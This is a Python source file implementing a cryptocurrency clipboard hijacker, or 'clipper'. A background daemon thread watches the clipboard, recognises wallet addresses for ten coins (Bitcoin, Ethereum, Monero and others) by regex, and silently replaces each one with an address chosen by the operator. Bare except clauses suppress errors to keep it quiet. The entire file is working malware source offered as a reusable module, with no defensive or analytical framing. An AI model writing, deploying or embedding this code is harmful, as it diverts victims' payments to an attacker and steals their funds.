import pyperclip
import re
import threading
import time

CRYPTO_PATTERNS = {
    'BTC': r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
    'ETH': r"^0x[a-fA-F0-9]{40}$",
    'DOGE': r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
    'LTC': r"^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$",
    'XMR': r"^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",
    'BCH': r"^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$",
    'DASH': r"^X[1-9A-HJ-NP-Za-km-z]{33}$",
    'TRX': r"^T[A-Za-z1-9]{33}$",
    'XRP': r"^r[0-9a-zA-Z]{33}$",
    'XLM': r"^G[0-9A-Z]{40,60}$"
}

class CryptoClipper:
    def __init__(self, addresses):
        self.addresses = addresses
        self.running = False
        self.thread = None
        self.last_clipboard = ""
    
    def match_and_replace(self):
        try:
            clipboard = str(pyperclip.paste())
            
            if clipboard == self.last_clipboard:
                return
            
            self.last_clipboard = clipboard
            
            for currency, pattern in CRYPTO_PATTERNS.items():
                if re.match(pattern, clipboard):
                    replacement = self.addresses.get(currency)
                    if replacement and replacement != clipboard:
                        pyperclip.copy(replacement)
                        break
        except:
            pass
    
    def monitor_loop(self):
        while self.running:
            try:
                pyperclip.waitForNewPaste()
                self.match_and_replace()
            except:
                time.sleep(0.5)
    
    def start(self):
        if self.running:
            return False
        
        self.running = True
        self.thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.thread.start()
        return True
    
    def stop(self):
        if not self.running:
            return False
        
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
        return True
    
    def is_running(self):
        return self.running

def create_clipper(addresses):
    return CryptoClipper(addresses)